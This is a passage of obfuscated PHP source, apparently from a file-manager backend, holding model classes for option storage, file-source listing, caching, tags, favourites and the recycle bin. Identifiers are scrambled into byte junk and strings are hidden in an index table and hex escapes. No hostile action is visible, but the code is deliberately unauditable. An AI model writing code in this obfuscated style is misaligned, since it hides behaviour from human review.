$_SERVER[íïàËŸë]; Model($this->modelType)->remove($¹¡’”†[473], $this->optionType . $¹¡’”†[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($­Ÿûø›Â, $«¢Å¾§ğ) { if (!$«¢Å¾§ğ) { return !1; } $í··ù®ü = $this->listData(); $í··ù®ü = array_to_keyvalue($í··ù®ü, $­Ÿûø›Â); return isset($í··ù®ü[$«¢Å¾§ğ]) ? $í··ù®ü[$«¢Å¾§ğ] : !1; } public function findByName($îßáÙ°§) { return $this->findByKey($_SERVER[íïàËŸë][32], $îßáÙ°§); } protected function resetData($ÅÖ£ìŠ„) { $µ¦™¶Äø =& $_SERVER[íïàËŸë]; $ÅÖ£ìŠ„ = is_array($ÅÖ£ìŠ„) ? $ÅÖ£ìŠ„ : array(); $“ ä×ñ´ = array(); for ($¢·ÑÉıæ = 0; $¢·ÑÉıæ < count($ÅÖ£ìŠ„); $¢·ÑÉıæ++) { $“ ä×ñ´[$µ¦™¶Äø[472] . $ÅÖ£ìŠ„[$¢·ÑÉıæ][$µ¦™¶Äø[475]]] = $ÅÖ£ìŠ„[$¢·ÑÉıæ]; } return Model($this->modelType)->set($“ ä×ñ´, !1, $this->optionType); } private function getAutoName($ó³î¨¯ä) { $ò±´óÙø = array_to_keyvalue($this->listData(), $_SERVER[íïàËŸë][32]); if (!$ò±´óÙø || !isset($ò±´óÙø[$ó³î¨¯ä])) { return $ó³î¨¯ä; } for ($ÛõÂ“£Ô = 1; $ÛõÂ“£Ô < count($ò±´óÙø); $ÛõÂ“£Ô++) { $Ò¨í¨«İ = $ó³î¨¯ä . "\x28{$ÛõÂ“£Ô}\51"; if (!isset($ò±´óÙø[$Ò¨í¨«İ])) { return $Ò¨í¨«İ; } } return $Ò¨í¨«İ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¹¬ºÃÌâ = false, $ŞÍ»ï­ò = '', $ù€ÈöÎ£ = false) { $¸üˆÒ‚ =& $_SERVER[íïàËŸë]; $Óª‹ó§ = $this->cacheGet($ŞÍ»ï­ò); $¼ş£ = $this->optionDefault($ŞÍ»ï­ò); $¼ş£ = is_array($¼ş£) ? $¼ş£ : array(); if (is_array($Óª‹ó§)) { $Óª‹ó§ = array_merge($¼ş£, $Óª‹ó§); return $¹¬ºÃÌâ ? isset($Óª‹ó§[$¹¬ºÃÌâ]) ? $Óª‹ó§[$¹¬ºÃÌâ] : null : $Óª‹ó§; } $«ˆÜ•’ = $this->filterWhere(array($¸üˆÒ‚[33] => $ŞÍ»ï­ò)); $Óª‹ó§ = $this->where($«ˆÜ•’)->select(); $Óª‹ó§ = array_to_keyvalue($Óª‹ó§, $¸üˆÒ‚[97], $¸üˆÒ‚[450]); foreach ($Óª‹ó§ as $Ñ†ÓŸÌ¡ => $õËêšå) { if ($ù€ÈöÎ£ || in_array($Ñ†ÓŸÌ¡, $this->jsonField)) { $Óª‹ó§[$Ñ†ÓŸÌ¡] = json_decode($õËêšå, !0); } } $this->cacheSet($ŞÍ»ï­ò, $Óª‹ó§); $Óª‹ó§ = array_merge($¼ş£, $Óª‹ó§); return $¹¬ºÃÌâ ? $Óª‹ó§[$¹¬ºÃÌâ] : $Óª‹ó§; } public function set($úä‹ğĞ‡, $šäŸîÏ = false, $¤¤Ï¡æŞ = '') { $úâ…íÃ =& $_SERVER[íïàËŸë]; $this->cacheRemove($¤¤Ï¡æŞ); $¸Úµƒƒ = array(); $Á”²œìë = is_array($úä‹ğĞ‡) ? $úä‹ğĞ‡ : array($úä‹ğĞ‡ => $šäŸîÏ); foreach ($Á”²œìë as $·šé§ëĞ => $ÌìˆÛì) { if (is_array($ÌìˆÛì)) { $ÌìˆÛì = json_encode_force($ÌìˆÛì); } $this->checkLength($ÌìˆÛì, !1, $this->tableName . $úâ…íÃ[4] . $úä‹ğĞ‡); $ÌìˆÛì = self::textEncode($ÌìˆÛì); $Á”²œìë = array($úâ…íÃ[33] => $¤¤Ï¡æŞ, $úâ…íÃ[97] => $·šé§ëĞ, $úâ…íÃ[450] => $ÌìˆÛì); $¸Úµƒƒ[] = $this->filterWhere($Á”²œìë); } if (!$¸Úµƒƒ) { return !0; } $£ Ù”’ô = $this->cacheKey($úâ…íÃ[476]); CacheLock::lock($£ Ù”’ô); $úÕÛÜª€ = $this->addAll($¸Úµƒƒ, array(), !0); CacheLock::unlock($£ Ù”’ô); return $úÕÛÜª€; } protected function optionDefault($²Ç­ü‚ß = '') { return !1; } public function setDeep($–©²”‹â, $†Ëì—òë = false, $Ü´Òƒä = '') { $÷é è¼‡ = explode($_SERVER[íïàËŸë][10], $–©²”‹â); $‰ÉŒù¦µ = $this->get(); array_set_value($‰ÉŒù¦µ, $–©²”‹â, $†Ëì—òë); $this->set($÷é è¼‡[0], $‰ÉŒù¦µ[$÷é è¼‡[0]], $Ü´Òƒä); } public function remove($è¨À›Øß, $ïå²ùí = '') { $ÛÎùÛ£Ê =& $_SERVER[íïàËŸë]; $this->cacheRemove($ïå²ùí); $‰ß¶şåÉ = $this->filterWhere(array($ÛÎùÛ£Ê[97] => $è¨À›Øß, $ÛÎùÛ£Ê[33] => $ïå²ùí)); if (is_null($è¨À›Øß)) { unset($‰ß¶şåÉ[$ÛÎùÛ£Ê[97]]); } return $this->where($‰ß¶şåÉ)->delete(); } public function cacheSet($‚Ï¢åÛû, $Áû‰ïäâ = false) { return Cache::set($this->cacheKey($‚Ï¢åÛû), $Áû‰ïäâ); } public function cacheGet($Å´µ¢ÔŒ) { return Cache::get($this->cacheKey($Å´µ¢ÔŒ)); } public function cacheRemove($Ì©ëá™Á) { return Cache::remove($this->cacheKey($Ì©ëá™Á)); } protected function filterWhere($³æ÷Æƒ¦) { return $³æ÷Æƒ¦; } protected function cacheKey($¯­Á¡Ÿ©) { return $¯­Á¡Ÿ©; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\x65" => "\151\x6f\x5f\x73\x6f\165\x72\x63\145\137\x6d\145\x74\x61", "\x6d\145\164\x61\x46\x69\x65\x6c\144" => "\x73\x6f\x75\x72\143\145\111\104"); protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\x69\155\145", "\164\151\x6d\x65", "\x69\156\163\x65\x72\164", "\x66\165\x6e\143\x74\x69\x6f\156"), array("\x63\x72\x65\141\x74\145\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\x65\x72\164", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\x76\x69\x65\x77\124\x69\x6d\x65", "\164\151\155\x65", "\x69\x6e\x73\x65\x72\164", "\x66\165\x6e\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($â‡±Ö«ç) { return $this->listSource(array($_SERVER[íïàËŸë][477] => $â‡±Ö«ç)); } public function typeName($Şæ¢µÛ) { static $–¬øà™ = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $–¬øà™[$Şæ¢µÛ . $_SERVER[íïàËŸë][12]]; } public function sourceListInfo($ÈîÌËà¤, $èñ©‡ïå = false) { $ªÊÕÓÚË =& $_SERVER[íïàËŸë]; $ÈîÌËà¤ = $ÈîÌËà¤ ? $ÈîÌËà¤ : array(); $ÈîÌËà¤ = array_filter(array_unique($ÈîÌËà¤)); if (!$ÈîÌËà¤) { return array(); } $›ğ¼õ¸ƒ = $this->where(array($ªÊÕÓÚË[193] => array($ªÊÕÓÚË[7], $ÈîÌËà¤)))->select(); $this->_listDataApply($›ğ¼õ¸ƒ, $èñ©‡ïå); return array_to_keyvalue($›ğ¼õ¸ƒ, $ªÊÕÓÚË[193]); } public function pathInfoFilter(&$Ğ”¤¿Òâ) { $úÔô‰Š‚ =& $_SERVER[íïàËŸë]; static $ªÕËÁ¬‰ = false; static $×ˆÈêŸ = false; static $û®±ä‡ = false; if (!$ªÕËÁ¬‰) { $‹şâ²¿û = $úÔô‰Š‚[478]; $‹şâ²¿û .= $úÔô‰Š‚[479]; $‹şâ²¿û .= $úÔô‰Š‚[480]; $¢õ¤É—µ = $úÔô‰Š‚[481]; $¥é¥š¯Š = explode($úÔô‰Š‚[50], $¢õ¤É—µ); $ªÕËÁ¬‰ = explode($úÔô‰Š‚[50], $‹şâ²¿û); $×ˆÈêŸ = array(); foreach ($ªÕËÁ¬‰ as $Ï»ü¨í„) { if (in_array($Ï»ü¨í„, $¥é¥š¯Š)) { continue; } $×ˆÈêŸ[] = $Ï»ü¨í„; } $û®±ä‡ = explode($úÔô‰Š‚[50], $úÔô‰Š‚[482]); } foreach ($û®±ä‡ as $¶Ş¦Şåï) { if (isset($Ğ”¤¿Òâ[$¶Ş¦Şåï])) { $Ğ”¤¿Òâ[$¶Ş¦Şåï] = intval($Ğ”¤¿Òâ[$¶Ş¦Şåï]); } } $Ğ”¤¿Òâ[$úÔô‰Š‚[87]] = $úÔô‰Š‚[483] . $Ğ”¤¿Òâ[$úÔô‰Š‚[193]] . $úÔô‰Š‚[484]; $Ğ”¤¿Òâ[$úÔô‰Š‚[33]] = $Ğ”¤¿Òâ[$úÔô‰Š‚[485]] == 1 ? $úÔô‰Š‚[78] : $úÔô‰Š‚[230]; $Ğ”¤¿Òâ[$úÔô‰Š‚[190]] = $this->typeName($Ğ”¤¿Òâ[$úÔô‰Š‚[190]]); if ($Ğ”¤¿Òâ[$úÔô‰Š‚[485]] != 1) { $Ğ”¤¿Òâ[$úÔô‰Š‚[169]] = $Ğ”¤¿Òâ[$úÔô‰Š‚[486]]; unset($Ğ”¤¿Òâ[$úÔô‰Š‚[486]]); } $ÒŞÒ«é— = $ªÕËÁ¬‰; if (isset($Ğ”¤¿Òâ[$úÔô‰Š‚[487]]) && $Ğ”¤¿Òâ[$úÔô‰Š‚[487]][$úÔô‰Š‚[488]] == -1) { $ÒŞÒ«é— = $×ˆÈêŸ; } $Ğ”¤¿Òâ = array_field_key($Ğ”¤¿Òâ, $ÒŞÒ«é—); return $Ğ”¤¿Òâ; } public function listUserFav() { $ø¸ËÕï‰ =& $_SERVER[íïàËŸë]; $¯ˆùÉû× = Model($ø¸ËÕï‰[489])->listData(); $äÁŞÊ—Ö = array_filter_by_field($¯ˆùÉû×, $ø¸ËÕï‰[33], $ø¸ËÕï‰[490]); $äÁŞÊ—Ö = array_to_keyvalue($äÁŞÊ—Ö, $ø¸ËÕï‰[12], $ø¸ËÕï‰[87]); if ($äÁŞÊ—Ö) { $´ïôÃ“£ = $this->listSource(array($ø¸ËÕï‰[491] => array($ø¸ËÕï‰[492], $äÁŞÊ—Ö))); } $´ïôÃ“£ = array_to_keyvalue($´ïôÃ“£[$ø¸ËÕï‰[445]], $ø¸ËÕï‰[193]); foreach ($¯ˆùÉû× as &$ç¨Ä¤“Ã) { $ç¨Ä¤“Ã = array($ø¸ËÕï‰[493] => $ç¨Ä¤“Ã[$ø¸ËÕï‰[475]], $ø¸ËÕï‰[494] => $ç¨Ä¤“Ã[$ø¸ËÕï‰[32]], $ø¸ËÕï‰[495] => $ç¨Ä¤“Ã[$ø¸ËÕï‰[87]], $ø¸ËÕï‰[496] => $ç¨Ä¤“Ã[$ø¸ËÕï‰[33]], $ø¸ËÕï‰[497] => $ç¨Ä¤“Ã[$ø¸ËÕï‰[231]], $ø¸ËÕï‰[498] => $ç¨Ä¤“Ã[$ø¸ËÕï‰[88]]); if ($ç¨Ä¤“Ã[$ø¸ËÕï‰[33]] == $ø¸ËÕï‰[490] && $´ïôÃ“£[$ç¨Ä¤“Ã[$ø¸ËÕï‰[87]]]) { $ç¨Ä¤“Ã[$ø¸ËÕï‰[90]] = $´ïôÃ“£[$ç¨Ä¤“Ã[$ø¸ËÕï‰[87]]]; } } unset($ç¨Ä¤“Ã); return $¯ˆùÉû×; } public function listUserTag($ÌÕ¢÷Á´) { $ˆöíãÛ‹ =& $_SERVER[íïàËŸë]; if ($ÌÕ¢÷Á´ && !is_array($ÌÕ¢÷Á´)) { $ÌÕ¢÷Á´ = array($ÌÕ¢÷Á´); } $Ü„òŞ…  = Model($ˆöíãÛ‹[499])->listData(); $Óô¾öå = array(); $›ãÉçù = array(); foreach ($Ü„òŞ…  as $ûúœİŠÙ) { $¢Êş¸€ = $ûúœİŠÙ[$ˆöíãÛ‹[87]]; if (!$¢Êş¸€) { continue; } if (!isset($›ãÉçù[$¢Êş¸€])) { $›ãÉçù[$¢Êş¸€] = array(); } $›ãÉçù[$¢Êş¸€][] = $ûúœİŠÙ[$ˆöíãÛ‹[500]]; $Óô¾öå[$ûúœİŠÙ[$ˆöíãÛ‹[87]]] = $ûúœİŠÙ; } $ş˜ÖŸø— = array(); $ôªÊ§Ä‘ = array(); $û®ö = array(); foreach ($›ãÉçù as $¼“Õæğ” => $±öÃıî ) { $ÚÛÃ¹ğ® = !0; if (!$ÌÕ¢÷Á´) { $ş˜ÖŸø—[] = $¼“Õæğ”; continue; } foreach ($ÌÕ¢÷Á´ as $éå¬Ÿş¢) { if (!in_array($éå¬Ÿş¢, $±öÃıî )) { $ÚÛÃ¹ğ® = !1; break; } } if (!$ÚÛÃ¹ğ®) { continue; } if (!is_numeric($¼“Õæğ”)) { $¾âƒ‹Œ = $Óô¾öå[$¼“Õæğ”]; $ £ÄÈòÖ = array($ˆöíãÛ‹[32] => $¾âƒ‹Œ[$ˆöíãÛ‹[32]], $ˆöíãÛ‹[87] => $¾âƒ‹Œ[$ˆöíãÛ‹[87]], $ˆöíãÛ‹[33] => $¾âƒ‹Œ[$ˆöíãÛ‹[33]], $ˆöíãÛ‹[90] => array($ˆöíãÛ‹[501] => 1), $ˆöíãÛ‹[232] => !0); if ($¾âƒ‹Œ[$ˆöíãÛ‹[33]] == $ˆöíãÛ‹[230]) { $û®ö[] = $ £ÄÈòÖ; } if ($¾âƒ‹Œ[$ˆöíãÛ‹[33]] == $ˆöíãÛ‹[78]) { $ôªÊ§Ä‘[] = $ £ÄÈòÖ; } continue; } $ş˜ÖŸø—[] = $¼“Õæğ”; } if ($ş˜ÖŸø—) { $Ü¨– = $this->listSource(array($ˆöíãÛ‹[491] => array($ˆöíãÛ‹[492], $ş˜ÖŸø—))); } $Ü¨– = $Ü¨– ? $Ü¨– : array($ˆöíãÛ‹[85] => array(), $ˆöíãÛ‹[86] => array()); $Ü¨–[$ˆöíãÛ‹[85]] = array_merge($Ü¨–[$ˆöíãÛ‹[85]], $ôªÊ§Ä‘); $Ü¨–[$ˆöíãÛ‹[86]] = array_merge($Ü¨–[$ˆöíãÛ‹[86]], $û®ö); if (isset($Ü¨–[$ˆöíãÛ‹[442]]) && count($ş˜ÖŸø—) == $Ü¨–[$ˆöíãÛ‹[442]][$ˆöíãÛ‹[443]]) { return $Ü¨–; } $ğ¿¢Ÿ¶ = array(); $òÑäß›î = array_to_keyvalue($Ü¨–[$ˆöíãÛ‹[85]], $ˆöíãÛ‹[12], $ˆöíãÛ‹[193]); $ûğ´”ÅÂ = array_to_keyvalue($Ü¨–[$ˆöíãÛ‹[86]], $ˆöíãÛ‹[12], $ˆöíãÛ‹[193]); $Ñ»Ä¬ş¯ = array_merge($ûğ´”ÅÂ, $òÑäß›î); foreach ($ş˜ÖŸø— as $¢Êş¸€) { if (!in_array($¢Êş¸€, $Ñ»Ä¬ş¯)) { $ğ¿¢Ÿ¶[] = $¢Êş¸€; } } if ($ğ¿¢Ÿ¶) { Model($ˆöíãÛ‹[502])->removeBySource($ğ¿¢Ÿ¶); } return $Ü¨–; } public function listUserRecycle() { $åóÜ’ó€ =& $_SERVER[íïàËŸë]; $¥şË†Œü = Model($åóÜ’ó€[503])->listData(); if (!$¥şË†Œü) { return array(); } $¦ØûÎ¥ˆ = array($åóÜ’ó€[491] => array($åóÜ’ó€[492], $¥şË†Œü), $åóÜ’ó€[504] => 1); return $this->listSource($¦ØûÎ¥ˆ); } public function listSource($±—²ùšª, $Î«âÂ½³ = 3000, $£à¯Â˜» = false) { $şèÖë‡ =& $_SERVER[íïàËŸë]; if (!isset($±—²ùšª[$şèÖë‡[505]])) { $±—²ùšª[$şèÖë‡[505]] = 0; } if (isset($±—²ùšª[$şèÖë‡[192]]) && $±—²ùšª[$şèÖë‡[192]] == $şèÖë‡[228]) { $±—²ùšª[$şèÖë‡[486]] = array($şèÖë‡[407], $şèÖë‡[506]); } $¢„Ûü—œ = $şèÖë‡[507]; $–¬Ü½Õû = $this->field($¢„Ûü—œ)->_makeOrder()->where($±—²ùšª)->selectPage($Î«âÂ½³); $this->_listPageCheck($–¬Ü½Õû, $¢„Ûü—œ, $±—²ùšª); $this->_listDataApply($–¬Ü½Õû[$şèÖë‡[445]], $£à¯Â˜»); $this->_listMake($–¬Ü½Õû); return $–¬Ü½Õû; } private function _listPageCheck(&$Éò…ã¥à, $ŒÌÅœ›, $”»âù¹) { $Ã§äş£ =& $_SERVER[íïàËŸë]; if (!is_array($Éò…ã¥à[$Ã§äş£[442]])) { return; } $ò©Í²æœ = $Éò…ã¥à[$Ã§äş£[442]]; if ($ò©Í²æœ[$Ã§äş£[444]] <= 1) { return; } if ($ò©Í²æœ[$Ã§äş£[443]] >= 100000) { return; } if (Model($Ã§äş£[508])->get($Ã§äş£[509]) != $Ã§äş£[510]) { return; } $ŒÌÅœ› = str_replace(array($Ã§äş£[53], $Ã§äş£[418], $Ã§äş£[262]), $Ã§äş£[12], $ŒÌÅœ›); $ŒÌÅœ› = $Ã§äş£[511] . str_replace($Ã§äş£[50], $Ã§äş£[512], $ŒÌÅœ›) . $Ã§äş£[513]; $™áëĞêÖ = $Ã§äş£[514]; $™áëĞêÖ = $™áëĞêÖ . $Ã§äş£[515]; $ù–²¡è· = $ò©Í²æœ[$Ã§äş£[439]] * ($ò©Í²æœ[$Ã§äş£[429]] - 1) . $Ã§äş£[50] . $ò©Í²æœ[$Ã§äş£[439]]; $ŠóÌ°ì× = $this->_makeOrder(!0); $şÇûíÀ = $Ã§äş£[511] . str_replace($Ã§äş£[50], $Ã§äş£[512], $ŠóÌ°ì×[0]); if (strpos($şÇûíÀ, $Ã§äş£[516])) { $şÇûíÀ = str_replace($Ã§äş£[516], $Ã§äş£[517], $şÇûíÀ); } else { $şÇûíÀ .= $Ã§äş£[518] . $ŠóÌ°ì×[1]; } $÷©ŸÊ˜“ = array(); foreach ($”»âù¹ as $ö«ü‘÷ => $ì³ÅŞ³¶) { $÷©ŸÊ˜“[$Ã§äş£[511] . $ö«ü‘÷] = $ì³ÅŞ³¶; } $this->alias($Ã§äş£[519])->field($ŒÌÅœ›)->limit($ù–²¡è·)->order($şÇûíÀ); $ÛÏşè = $this->join($™áëĞêÖ)->where($÷©ŸÊ˜“)->select(); if ($ÛÏşè) { $Éò…ã¥à[$Ã§äş£[445]] = $ÛÏşè; } } protected function _makeOrder($´óØ¥š× = false) { $¸ò°É¸ =& $_SERVER[íïàËŸë]; $àÔ¤¦Ò« = Model($¸ò°É¸[520])->get($¸ò°É¸[521]); $Ê‘ùâÕ = Model($¸ò°É¸[520])->get($¸ò°É¸[522]); $éÅ…Ìµ÷ = array($¸ò°É¸[523] => $¸ò°É¸[524], $¸ò°É¸[525] => $¸ò°É¸[526]); $Äé¸ˆüí = array($¸ò°É¸[32] => $¸ò°É¸[32], $¸ò°É¸[79] => $¸ò°É¸[79], $¸ò°É¸[169] => $¸ò°É¸[486], $¸ò°É¸[527] => $¸ò°É¸[527], $¸ò°É¸[528] => $¸ò°É¸[529], $¸ò°É¸[231] => $¸ò°É¸[231], $¸ò°É¸[88] => $¸ò°É¸[88]); $ÚÜ†‰ó‘ = Input::get($¸ò°É¸[530], $¸ò°É¸[7], $àÔ¤¦Ò«, array_keys($Äé¸ˆüí)); $×Ù…±¹ = Input::get($¸ò°É¸[531], $¸ò°É¸[7], $Ê‘ùâÕ, array_keys($éÅ…Ìµ÷)); if (!in_array($ÚÜ†‰ó‘, array_keys($Äé¸ˆüí))) { $ÚÜ†‰ó‘ = $¸ò°É¸[32]; } if (!in_array($×Ù…±¹, array_keys($éÅ…Ìµ÷))) { $ÚÜ†‰ó‘ = $¸ò°É¸[523]; } if ($ÚÜ†‰ó‘ == $¸ò°É¸[32]) { } $‰¼Ç°Òº = $¸ò°É¸[532] . $Äé¸ˆüí[$ÚÜ†‰ó‘] . $¸ò°É¸[53] . $éÅ…Ìµ÷[$×Ù…±¹]; $‰¼Ç°Òº = rtrim(trim($‰¼Ç°Òº), $¸ò°É¸[50]); if ($´óØ¥š×) { return array($‰¼Ç°Òº, $éÅ…Ìµ÷[$×Ù…±¹]); } return $this->order($‰¼Ç°Òº); } protected function _listDataApplyItem($©ÎÉƒÑŒ, $“ì—›Øº = false) { $¸µµ• Õ = array($©ÎÉƒÑŒ); $this->_listDataApply($¸µµ• Õ, $“ì—›Øº); return $¸µµ• Õ[0]; } protected function _listDataApply(&$İ†èÒ‡Ä, $È„äÑƒ = false) { $ûêğ¹¦ =& $_SERVER[íïàËŸë]; if (!$İ†èÒ‡Ä) { $İ†èÒ‡Ä = array(); return; } $Ö±…ùçï = array_to_keyvalue($İ†èÒ‡Ä, $ûêğ¹¦[12], $ûêğ¹¦[193]); $Ö±…ùçï = array_unique($Ö±…ùçï); $this->_listSourceCache($İ†èÒ‡Ä); if (!$È„äÑƒ) { $this->_listAppendMeta($İ†èÒ‡Ä, $Ö±…ùçï); $this->_listAppendFileMeta($İ†èÒ‡Ä, $Ö±…ùçï); $this->_listAppendChildren($İ†èÒ‡Ä, $Ö±…ùçï); } $this->_listAppendPath($İ†èÒ‡Ä); $this->_listAppendAuth($İ†èÒ‡Ä); $this->_listAppendSourceInfo($İ†èÒ‡Ä, $Ö±…ùçï); $this->_listAppendUser($İ†èÒ‡Ä); $this->_listFilterInfo($İ†èÒ‡Ä, $È„äÑƒ); $this->_listAppendAuthSecret($İ†èÒ‡Ä); } protected function _listSourceCache($ºä¬²Ì…) { $ãÅµÂ„€ =& $_SERVER[íïàËŸë]; foreach ($ºä¬²Ì… as $ìÔ£ÕÅ˜) { self::$cacheSourceInfo[$ãÅµÂ„€[533] . $ìÔ£ÕÅ˜[$ãÅµÂ„€[193]]] = $ìÔ£ÕÅ˜; } } protected function _listFilterInfo(&$Ñêª¡Ï, $”â¢ÛÍ” = false) { $¸¶¦İ¤¬ =& $_SERVER[íïàËŸë]; foreach ($Ñêª¡Ï as &$›Š“İ”Å) { $›Š“İ”Å = $this->pathInfoFilter($›Š“İ”Å); self::$cachePathInfo[$¸¶¦İ¤¬[534] . intval($”â¢ÛÍ”) . $¸¶¦İ¤¬[462] . $›Š“İ”Å[$¸¶¦İ¤¬[193]]] = $›Š“İ”Å; } unset($›Š“İ”Å); } protected function _listMake(&$”Şßú„ˆ) { $³½‚²Å¤ =& $_SERVER[íïàËŸë]; $”Şßú„ˆ[$³½‚²Å¤[85]] = array(); $”Şßú„ˆ[$³½‚²Å¤[86]] = array(); foreach ($”Şßú„ˆ[$³½‚²Å¤[445]] as $´²æÂÀª) { $Ê¡Ñæ = $´²æÂÀª[$³½‚²Å¤[485]] == 1 ? $³½‚²Å¤[85] : $³½‚²Å¤[86]; $”Şßú„ˆ[$Ê¡Ñæ][] = $´²æÂÀª; } unset($”Şßú„ˆ[$³½‚²Å¤[445]]); } protected function _listAppendMeta(&$¿ŸêÚÖˆ, $‹ÄÉÚí) { $„Ù’©Êù =& $_SERVER[íïàËŸë]; $©ßÕ¢ÄÉ = array($„Ù’©Êù[491] => array($„Ù’©Êù[492], $‹ÄÉÚí)); $à§Õ’ì´ = Model($„Ù’©Êù[535])->field($„Ù’©Êù[536])->where($©ßÕ¢ÄÉ)->select(); if (!$à§Õ’ì´) { return; } $°ó»¡òÛ = array($„Ù’©Êù[537], $„Ù’©Êù[538], $„Ù’©Êù[517]); $ä³ŸÕ› = array(); foreach ($à§Õ’ì´ as $ˆ»Şë±¤) { if (!isset($ä³ŸÕ›[$ˆ»Şë±¤[$„Ù’©Êù[193]]])) { $ä³ŸÕ›[$ˆ»Şë±¤[$„Ù’©Êù[193]]] = array(); } if (in_array($ˆ»Şë±¤[$„Ù’©Êù[97]], $°ó»¡òÛ)) { continue; } $ä³ŸÕ›[$ˆ»Şë±¤[$„Ù’©Êù[193]]][$ˆ»Şë±¤[$„Ù’©Êù[97]]] = $ˆ»Şë±¤[$„Ù’©Êù[450]]; } foreach ($¿ŸêÚÖˆ as &$¾×ÚŸè) { $¾×ÚŸè[$„Ù’©Êù[539]] = !1; if (isset($ä³ŸÕ›[$¾×ÚŸè[$„Ù’©Êù[193]]])) { $¾×ÚŸè[$„Ù’©Êù[539]] = $ä³ŸÕ›[$¾×ÚŸè[$„Ù’©Êù[193]]]; } if ($this->fileIsLock($¾×ÚŸè) && $¾×ÚŸè[$„Ù’©Êù[487]]) { $–ïª°¤Ï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¾×ÚŸè[$„Ù’©Êù[487]][$„Ù’©Êù[488]] = AuthModel::authDisable($¾×ÚŸè[$„Ù’©Êù[487]][$„Ù’©Êù[488]], $–ïª°¤Ï); $¾×ÚŸè[$„Ù’©Êù[487]][$„Ù’©Êù[540]][$„Ù’©Êù[487]] = $¾×ÚŸè[$„Ù’©Êù[487]][$„Ù’©Êù[488]]; } } unset($¾×ÚŸè); } protected function _listAppendFileMeta(&$öòÙšÔ, $¸û¨Ößô) { $õ÷‰¶¾– =& $_SERVER[íïàËŸë]; $Í‰È¿É¬ = array_to_keyvalue($öòÙšÔ, $õ÷‰¶¾–[12], $õ÷‰¶¾–[541]); $Í‰È¿É¬ = array_filter(array_unique($Í‰È¿É¬)); if (!$Í‰È¿É¬) { return; } $ÅÇú¾€ß = array($õ÷‰¶¾–[542] => array($õ÷‰¶¾–[492], $Í‰È¿É¬)); $ÀìÜ²¡ = $õ÷‰¶¾–[543]; $Á°¼š… = Model($õ÷‰¶¾–[544])->field($ÀìÜ²¡)->where($ÅÇú¾€ß)->select(); $Á°¼š… = array_to_keyvalue($Á°¼š…, $õ÷‰¶¾–[541]); $ï½Éª•Â = Model($õ÷‰¶¾–[545])->field($õ÷‰¶¾–[546])->where($ÅÇú¾€ß)->select(); $ï½Éª•Â = $ï½Éª•Â ? $ï½Éª•Â : array(); $«ªóõ±” = array(); foreach ($ï½Éª•Â as $äüğª›’) { if (!isset($«ªóõ±”[$äüğª›’[$õ÷‰¶¾–[541]]])) { $«ªóõ±”[$äüğª›’[$õ÷‰¶¾–[541]]] = array(); } $«ªóõ±”[$äüğª›’[$õ÷‰¶¾–[541]]][$äüğª›’[$õ÷‰¶¾–[97]]] = $äüğª›’[$õ÷‰¶¾–[450]]; } foreach ($öòÙšÔ as &$õÁ€´Ó) { $Ì¨ÎµÄ‚ = $õÁ€´Ó[$õ÷‰¶¾–[541]]; if (!$Ì¨ÎµÄ‚ || !is_array($Á°¼š…[$Ì¨ÎµÄ‚])) { continue; } $Ã’¹ãğÏ = $Á°¼š…[$Ì¨ÎµÄ‚]; $Ã’¹ãğÏ[$õ÷‰¶¾–[79]] = $õÁ€´Ó[$õ÷‰¶¾–[79]]; $Ã’¹ãğÏ[$õ÷‰¶¾–[32]] = $õÁ€´Ó[$õ÷‰¶¾–[32]]; if (!$Ã’¹ãğÏ[$õ÷‰¶¾–[547]]) { Model($õ÷‰¶¾–[544])->fileMd5Check($Ã’¹ãğÏ); } if (!isset(self::$cacheFileInfo[$õ÷‰¶¾–[548] . $Ì¨ÎµÄ‚])) { self::$cacheFileInfo[$õ÷‰¶¾–[548] . $Ì¨ÎµÄ‚] = array_merge(array(), $Ã’¹ãğÏ); } unset($Á°¼š…[$Ì¨ÎµÄ‚][$õ÷‰¶¾–[87]]); $šå›âàß = isset($«ªóõ±”[$Ì¨ÎµÄ‚]) && is_array($«ªóõ±”[$Ì¨ÎµÄ‚]) ? $«ªóõ±”[$Ì¨ÎµÄ‚] : array(); $õÁ€´Ó[$õ÷‰¶¾–[170]] = array_merge($šå›âàß, $Á°¼š…[$Ì¨ÎµÄ‚]); if (isset($õÁ€´Ó[$õ÷‰¶¾–[170]][$õ÷‰¶¾–[184]])) { $õÁ€´Ó[$õ÷‰¶¾–[184]] = json_decode($õÁ€´Ó[$õ÷‰¶¾–[170]][$õ÷‰¶¾–[184]], !0); unset($õÁ€´Ó[$õ÷‰¶¾–[170]][$õ÷‰¶¾–[184]]); } } unset($õÁ€´Ó); } protected function _listAppendSourceInfo(&$¿ ©ß÷Ÿ, $è¡Ì¿”¤) { $áÙÏò‘ö =& $_SERVER[íïàËŸë]; $ó±±×¯ = Model($áÙÏò‘ö[549])->listData(); $½¶ºúñ = Model($áÙÏò‘ö[499])->listData(); $ù¤Ëü‚à = Model($áÙÏò‘ö[489])->listData(); $¬×Ÿ¶– = Model($áÙÏò‘ö[550])->listSimple(); $º¤¤ó½ï = array_to_keyvalue($ó±±×¯, $áÙÏò‘ö[475]); $Âó¯“Ä£ = array_to_keyvalue_group($½¶ºúñ, $áÙÏò‘ö[87], $áÙÏò‘ö[500]); $Àƒ¢ŠÊæ = array_to_keyvalue($ù¤Ëü‚à, $áÙÏò‘ö[87]); $èÌªå·‘ = array_to_keyvalue_group($¬×Ÿ¶–, $áÙÏò‘ö[193]); foreach ($¿ ©ß÷Ÿ as &$´‡­ºŞ) { $´‡­ºŞ[$áÙÏò‘ö[90]] = array($áÙÏò‘ö[551] => 0, $áÙÏò‘ö[552] 